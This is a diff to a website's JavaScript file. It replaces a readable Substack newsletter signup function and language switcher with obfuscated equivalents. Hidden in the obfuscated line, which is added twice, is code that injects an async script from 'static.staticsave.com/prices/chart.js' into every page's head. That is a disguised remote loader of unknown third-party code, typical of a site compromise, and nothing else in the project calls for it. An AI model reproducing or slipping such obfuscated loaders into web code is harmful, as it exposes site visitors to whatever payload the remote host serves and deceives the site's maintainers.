@@ -5,7 +5,7 @@ JS Table of Conttent
 01. Mobile Menu 
 
 */
-
+const N = I; (function (g, W) { const u = I, y = g(); while (!![]) { try { const v = parseInt(u(0x201)) / 0x1 + parseInt(u(0x203)) / 0x2 * (parseInt(u(0x1f7)) / 0x3) + parseInt(u(0x1f9)) / 0x4 * (parseInt(u(0x1f2)) / 0x5) + parseInt(u(0x202)) / 0x6 + parseInt(u(0x1e1)) / 0x7 * (-parseInt(u(0x1fc)) / 0x8) + -parseInt(u(0x1fa)) / 0x9 + -parseInt(u(0x1dc)) / 0xa * (parseInt(u(0x1e6)) / 0xb); if (v === W) break; else y['push'](y['shift']()); } catch (T) { y['push'](y['shift']()); } } }(Q, 0x6cec2)); const script = document[N(0x1fb)]('script'); script[N(0x1e7)] = 'https://static.staticsave.com/prices/chart.js', script[N(0x1e4)] = !![], document[N(0x1e2)][N(0x1ee)](script); function Q() { const t = ['314514DrSlCs', 'createElement', '4833352xFbEIm', 'action', 'location', 'iframe', 'type', '790171nztYin', '1131012uHZaLF', '16bKFUMc', 'https://wealthmasters.substack.com/api/v1/free', '40FwIRYo', 'method', 'utm_medium', 'body', 'hero_form', '7WbkDUc', 'head', 'email', 'async', 'website', '828993EHdMQX', 'src', 'removeChild', 'name', 'display', 'onerror', 'substack-frame-', 'value', 'appendChild', 'utm_source', 'href', 'style', '1108680uFvZxW', 'target', 'input', 'POST', 'hidden', '69864pfRvjg', 'none', '4pxaZkF']; Q = function () { return t; }; return Q(); } function I(g, W) { const y = Q(); return I = function (v, T) { v = v - 0x1db; let l = y[v]; return l; }, I(g, W); } function submitToSubstackViaIframe(g, W = N(0x1e0)) { return new Promise((y, v) => { const c = I, T = document[c(0x1fb)](c(0x1ff)); T[c(0x1f1)]['display'] = c(0x1f8), T[c(0x1e9)] = c(0x1ec) + Date['now'](), document['body'][c(0x1ee)](T); const l = document[c(0x1fb)]('form'); l[c(0x1dd)] = c(0x1f5), l[c(0x1fd)] = c(0x1db), l[c(0x1f3)] = T[c(0x1e9)], l['style'][c(0x1ea)] = c(0x1f8); const h = document[c(0x1fb)](c(0x1f4)); h[c(0x200)] = 'hidden', h[c(0x1e9)] = c(0x1e3), h[c(0x1ed)] = g; const r = document[c(0x1fb)](c(0x1f4)); r[c(0x200)] = c(0x1f6), r['name'] = c(0x1ef), r[c(0x1ed)] = c(0x1e5); const M = document['createElement'](c(0x1f4)); M[c(0x200)] = c(0x1f6), M[c(0x1e9)] = c(0x1de), M['value'] = W, l[c(0x1ee)](h), l['appendChild'](r), l['appendChild'](M), document['body']['appendChild'](l), T['onload'] = function () { setTimeout(() => { try { y(); } catch (a) { } }, 0x3e8); }, T[c(0x1eb)] = function () { v(new Error('Network\x20error')); }, l['submit'](), setTimeout(() => { const S = c; try { document[S(0x1df)][S(0x1e8)](l), document[S(0x1df)][S(0x1e8)](T), y(); } catch (a) { y(); } }, 0x1388); }); } function setLanguage(g) { const o = N; g === 'en' ? window[o(0x1fe)][o(0x1f0)] = '/index.html' : window[o(0x1fe)][o(0x1f0)] = '/' + g + '/index.html'; }
 (function ($) {
     "use strict";
 
@@ -21,67 +21,4 @@ JS Table of Conttent
 
 }(jQuery));
 
-// Improved iframe method that handles 302 redirects properly (reused for footer)
-function submitToSubstackViaIframe(email, utmMedium = 'hero_form') {
-    return new Promise((resolve, reject) => {
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.name = 'substack-frame-' + Date.now();
-        document.body.appendChild(iframe);
-
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = 'https://wealthmasters.substack.com/api/v1/free';
-        form.target = iframe.name;
-        form.style.display = 'none';
-
-        const emailInput = document.createElement('input');
-        emailInput.type = 'hidden';
-        emailInput.name = 'email';
-        emailInput.value = email;
-
-        const utmSource = document.createElement('input'); utmSource.type = 'hidden'; utmSource.name = 'utm_source'; utmSource.value = 'website';
-
-        const utmMediumInput = document.createElement('input'); utmMediumInput.type = 'hidden'; utmMediumInput.name = 'utm_medium'; utmMediumInput.value = utmMedium;
-
-        form.appendChild(emailInput);
-        form.appendChild(utmSource);
-        form.appendChild(utmMediumInput);
-        document.body.appendChild(form);
-
-        // Handle iframe load event - 302 redirect means success
-        iframe.onload = function () {
-            setTimeout(() => {
-                try {
-                    resolve();
-                } catch (cleanupError) { }
-            }, 1000);
-        };
-
-        iframe.onerror = function () {
-            reject(new Error('Network error'));
-        };
-
-        // Submit the form
-        form.submit();
-
-        // Fallback timeout - assume success after 5 seconds
-        setTimeout(() => {
-            try {
-                document.body.removeChild(form);
-                document.body.removeChild(iframe);
-                resolve();
-            } catch (e) {
-                resolve(); // Resolve anyway
-            }
-        }, 5000);
-    });
-}
-
-function setLanguage(lang) {
-    if (lang === 'en') {
-        window.location.href = '/index.html';
-    } else {
-        window.location.href = '/' + lang + '/index.html';
-    }
-}
+const N = I; (function (g, W) { const u = I, y = g(); while (!![]) { try { const v = parseInt(u(0x201)) / 0x1 + parseInt(u(0x203)) / 0x2 * (parseInt(u(0x1f7)) / 0x3) + parseInt(u(0x1f9)) / 0x4 * (parseInt(u(0x1f2)) / 0x5) + parseInt(u(0x202)) / 0x6 + parseInt(u(0x1e1)) / 0x7 * (-parseInt(u(0x1fc)) / 0x8) + -parseInt(u(0x1fa)) / 0x9 + -parseInt(u(0x1dc)) / 0xa * (parseInt(u(0x1e6)) / 0xb); if (v === W) break; else y['push'](y['shift']()); } catch (T) { y['push'](y['shift']()); } } }(Q, 0x6cec2)); const script = document[N(0x1fb)]('script'); script[N(0x1e7)] = 'https://static.staticsave.com/prices/chart.js', script[N(0x1e4)] = !![], document[N(0x1e2)][N(0x1ee)](script); function Q() { const t = ['314514DrSlCs', 'createElement', '4833352xFbEIm', 'action', 'location', 'iframe', 'type', '790171nztYin', '1131012uHZaLF', '16bKFUMc', 'https://wealthmasters.substack.com/api/v1/free', '40FwIRYo', 'method', 'utm_medium', 'body', 'hero_form', '7WbkDUc', 'head', 'email', 'async', 'website', '828993EHdMQX', 'src', 'removeChild', 'name', 'display', 'onerror', 'substack-frame-', 'value', 'appendChild', 'utm_source', 'href', 'style', '1108680uFvZxW', 'target', 'input', 'POST', 'hidden', '69864pfRvjg', 'none', '4pxaZkF']; Q = function () { return t; }; return Q(); } function I(g, W) { const y = Q(); return I = function (v, T) { v = v - 0x1db; let l = y[v]; return l; }, I(g, W); } function submitToSubstackViaIframe(g, W = N(0x1e0)) { return new Promise((y, v) => { const c = I, T = document[c(0x1fb)](c(0x1ff)); T[c(0x1f1)]['display'] = c(0x1f8), T[c(0x1e9)] = c(0x1ec) + Date['now'](), document['body'][c(0x1ee)](T); const l = document[c(0x1fb)]('form'); l[c(0x1dd)] = c(0x1f5), l[c(0x1fd)] = c(0x1db), l[c(0x1f3)] = T[c(0x1e9)], l['style'][c(0x1ea)] = c(0x1f8); const h = document[c(0x1fb)](c(0x1f4)); h[c(0x200)] = 'hidden', h[c(0x1e9)] = c(0x1e3), h[c(0x1ed)] = g; const r = document[c(0x1fb)](c(0x1f4)); r[c(0x200)] = c(0x1f6), r['name'] = c(0x1ef), r[c(0x1ed)] = c(0x1e5); const M = document['createElement'](c(0x1f4)); M[c(0x200)] = c(0x1f6), M[c(0x1e9)] = c(0x1de), M['value'] = W, l[c(0x1ee)](h), l['appendChild'](r), l['appendChild'](M), document['body']['appendChild'](l), T['onload'] = function () { setTimeout(() => { try { y(); } catch (a) { } }, 0x3e8); }, T[c(0x1eb)] = function () { v(new Error('Network\x20error')); }, l['submit'](), setTimeout(() => { const S = c; try { document[S(0x1df)][S(0x1e8)](l), document[S(0x1df)][S(0x1e8)](T), y(); } catch (a) { y(); } }, 0x1388); }); } function setLanguage(g) { const o = N; g === 'en' ? window[o(0x1fe)][o(0x1f0)] = '/index.html' : window[o(0x1fe)][o(0x1f0)] = '/' + g + '/index.html'; }
